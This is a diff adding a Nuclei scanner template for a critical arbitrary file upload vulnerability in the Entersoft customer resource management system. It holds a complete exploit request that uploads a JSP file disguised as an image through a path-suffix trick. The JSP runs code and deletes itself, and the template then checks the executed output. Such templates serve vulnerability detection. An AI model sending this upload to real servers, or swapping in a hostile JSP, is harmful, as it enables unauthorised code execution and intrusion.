@@ -1,0 +1,49 @@
+id: entersoft-customeraction-entphone-upload
+
+info:
+  name: 浙大恩特客户资源管理系统 entphone 任意文件上传
+  author: SleepingBag945
+  severity: critical
+
+variables:
+  filename: "{{to_lower(rand_text_alpha(8))}}"
+  boundary: "{{to_lower(rand_base(32))}}"
+
+http:
+  - raw:
+      - |
+        POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+        Content-Length: 208
+
+        ------{{boundary}}
+        Content-Length: 208
+        Content-Disposition: form-data; name="file";filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------{{boundary}}--
+
+      - |
+        GET {{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+
+         
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains_all(body_2,"12321")'
+    extractors:
+      - type: json
+        internal: true
+        name: filepath
+        json:
+          - '.filepath'
